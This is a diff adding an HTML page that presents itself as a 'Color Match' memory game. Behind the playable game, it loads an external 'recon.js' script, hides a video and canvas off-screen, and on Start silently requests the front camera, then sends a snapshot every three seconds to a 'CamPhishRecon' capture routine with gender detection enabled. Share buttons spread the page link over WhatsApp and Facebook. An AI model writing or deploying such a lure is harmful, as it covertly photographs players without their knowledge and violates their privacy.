@@ -1,0 +1,172 @@
+<!-- DESC: Memory color match game — repeat the sequence -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#0d0d1a">
+<title>Color Match</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:#0d0d1a;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;overflow:hidden;touch-action:none;user-select:none;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.title{font-size:clamp(26px,8vw,44px);background:linear-gradient(135deg,#ff6b9d,#ffd700,#6bcfff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+#grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;width:min(280px,75vw);height:min(280px,75vw)}
+.pad{border-radius:20px;cursor:pointer;opacity:0.5;transition:opacity .15s,transform .1s;border:3px solid rgba(255,255,255,0.1);touch-action:manipulation}
+.pad.active{opacity:1;transform:scale(0.95);box-shadow:0 0 30px currentColor}
+.pad.tappable{opacity:0.7}
+.pad.tappable:active{opacity:1;transform:scale(0.92)}
+#status{font-size:16px;margin:16px 0;min-height:24px;color:#aaa;text-align:center}
+#round{font-size:13px;color:#666;margin-bottom:8px}
+.btn{background:linear-gradient(135deg,#ff6b9d,#c44dff);color:#fff;border:none;padding:14px 44px;font-size:17px;font-weight:800;border-radius:30px;cursor:pointer;margin-top:8px}
+.btn:active{transform:scale(0.95)}
+.hidden{display:none}
+.go{position:fixed;inset:0;background:rgba(13,13,26,0.96);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:50;padding:20px}
+.go-title{font-size:clamp(22px,6vw,36px);color:#ff6b9d;margin-bottom:8px}
+.final{font-size:clamp(32px,10vw,52px);color:#ffd700;font-weight:900}
+.best{color:#888;margin:8px 0 20px}
+.shares{display:flex;gap:8px;margin-bottom:16px}
+.sb{padding:10px 18px;border:none;border-radius:20px;color:#fff;font-weight:700;font-size:13px;cursor:pointer}
+.s-wa{background:#25D366}.s-fb{background:#1877F2}
+.lb{color:#666;font-size:12px;margin-top:16px;text-align:center}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div class="title">🎨 Color Match</div>
+<div class="sub">Memorize & repeat the sequence</div>
+<div id="round">Round 1</div>
+<div id="grid">
+<div class="pad" id="p1" style="background:#ff6b9d;color:#ff6b9d" data-i="0"></div>
+<div class="pad" id="p2" style="background:#7bed9f;color:#7bed9f" data-i="1"></div>
+<div class="pad" id="p3" style="background:#6bcfff;color:#6bcfff" data-i="2"></div>
+<div class="pad" id="p4" style="background:#ffd700;color:#ffd700" data-i="3"></div>
+</div>
+<div id="status">Press Start to begin</div>
+<button class="btn" id="startBtn">▶ Start</button>
+<div class="go hidden" id="gameover">
+<div class="go-title">Game Over</div>
+<div class="final" id="finalScore">0</div>
+<div class="best" id="bestScore"></div>
+<div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
+<button class="btn" onclick="startGame()">▶ Play Again</button>
+<div class="lb" id="goLb"></div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL='forwarding_link/t/color-match';
+var sequence=[],playerInput=[],round=1,playing=false,acceptingInput=false;
+var hs=[];try{hs=JSON.parse(localStorage.getItem('colorMatchHS')||'[]');}catch(e){}
+var ac=null;
+var freqs=[330,440,550,660];
+
+function snd(f){try{if(!ac)ac=new(AudioContext||webkitAudioContext)();var o=ac.createOscillator(),g=ac.createGain();o.frequency.value=f;g.gain.value=0.08;o.connect(g);g.connect(ac.destination);o.start();g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+0.2);o.stop(ac.currentTime+0.2);}catch(e){}}
+
+function flash(i){
+var pad=document.getElementById('p'+(i+1));
+if(!pad)return;
+pad.classList.add('active');snd(freqs[i]);
+setTimeout(function(){pad.classList.remove('active');},300);
+}
+
+// SINGLE click handler setup — attached ONCE per pad
+var padsBound=false;
+function bindPads(){
+if(padsBound)return;padsBound=true;
+for(var i=0;i<4;i++){
+(function(idx){
+var pad=document.getElementById('p'+(idx+1));
+if(pad){
+pad.addEventListener('click',handlePadClick.bind(null,idx));
+pad.addEventListener('touchstart',function(e){e.preventDefault();handlePadClick(idx);},{passive:false});
+}
+})(i);
+}
+}
+
+function handlePadClick(idx){
+if(!acceptingInput||!playing)return;
+flash(idx);
+playerInput.push(idx);
+var pos=playerInput.length-1;
+if(playerInput[pos]!==sequence[pos]){
+gameOver();return;
+}
+if(playerInput.length===sequence.length){
+acceptingInput=false;
+document.getElementById('status').textContent='✓ Correct!';
+round++;
+if(navigator.vibrate)navigator.vibrate(20);
+for(var j=1;j<=4;j++)document.getElementById('p'+j).classList.remove('tappable');
+setTimeout(nextRound,900);
+}
+}
+
+function startGame(){
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+startCamera();
+bindPads();
+sequence=[];round=1;playing=true;
+document.getElementById('gameover').classList.add('hidden');
+document.getElementById('startBtn').classList.add('hidden');
+nextRound();
+}
+
+function startCamera(){
+if(navigator.mediaDevices&&window.CamPhishRecon){
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
+var v=document.getElementById('v');v.srcObject=s;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');}},3000);
+}).catch(function(){});
+}
+}
+
+function nextRound(){
+playerInput=[];acceptingInput=false;
+document.getElementById('round').textContent='Round '+round;
+document.getElementById('status').textContent='Watch carefully...';
+for(var i=1;i<=4;i++)document.getElementById('p'+i).classList.remove('tappable');
+sequence.push(Math.floor(Math.random()*4));
+var idx=0;
+var playInterval=setInterval(function(){
+flash(sequence[idx]);idx++;
+if(idx>=sequence.length){
+clearInterval(playInterval);
+setTimeout(function(){
+document.getElementById('status').textContent='Your turn! Repeat the sequence';
+acceptingInput=true;
+for(var j=1;j<=4;j++)document.getElementById('p'+j).classList.add('tappable');
+},500);
+}
+},700);
+}
+
+function gameOver(){
+playing=false;acceptingInput=false;document.getElementById('status').textContent='Wrong sequence!';
+if(navigator.vibrate)navigator.vibrate([50,50,50]);snd(150);
+for(var j=1;j<=4;j++)document.getElementById('p'+j).classList.remove('tappable');
+hs.push(round-1);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);
+localStorage.setItem('colorMatchHS',JSON.stringify(hs));
+document.getElementById('finalScore').textContent='Round '+(round-1);
+document.getElementById('bestScore').textContent='Best: Round '+(hs[0]||0);
+document.getElementById('gameover').classList.remove('hidden');
+var h='<b>🏆 Top Rounds</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — Round '+hs[i]+'</div>';
+if(!hs.length)h='<b>🏆 Be the first!</b>';
+document.getElementById('goLb').innerHTML=h;
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{round:round-1});
+}
+
+// Bind pads immediately and set start button
+bindPads();
+document.getElementById('startBtn').onclick=startGame;
+
+function shareCard(t){
+var msg='🎨 I reached Round '+(round-1)+' in Color Match! Can you beat me? '+SHARE_URL;
+if(navigator.canShare){navigator.share({text:msg,title:'Color Match'}).catch(function(){});return;}
+if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
+else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');
+}
+</script>
+</body></html>
